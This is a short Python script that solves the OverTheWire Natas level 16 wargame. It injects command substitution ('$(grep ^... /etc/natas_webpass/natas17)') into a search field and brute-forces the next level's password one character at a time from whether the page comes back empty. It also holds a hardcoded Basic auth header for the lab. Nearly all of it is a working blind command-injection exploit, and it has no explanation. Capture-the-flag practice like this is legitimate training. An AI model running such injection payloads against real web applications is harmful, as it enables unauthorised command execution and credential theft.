import requests

url = "http://natas16.natas.labs.overthewire.org/"

payload = {'needle': 'apple$(grep ^.p /etc/natas_webpass/natas17))'}
files = [

]
headers = {
    'Authorization': 'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=='
}

response = requests.request("POST", url, headers=headers, data=payload, files=files)
response = str(response.text.encode('utf8'))


def get_result(res):
    string = res.split("\\n")
    start = string.index("<pre>")
    end = string.index("</pre>")
    return string[start + 1:end]


chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
print(get_result(response))
password = ""
for i in range(32):
    for char in chars:
        payload = {'needle': 'apple$(grep ^' + password + char + ' /etc/natas_webpass/natas17)'}
        response = requests.request("POST", url, headers=headers, data=payload, files=files)
        response = str(response.text.encode('utf8'))
        result = get_result(response)
        if len(result) == 0:
            password += char
    print(password)
    if len(password) == 32:
        break


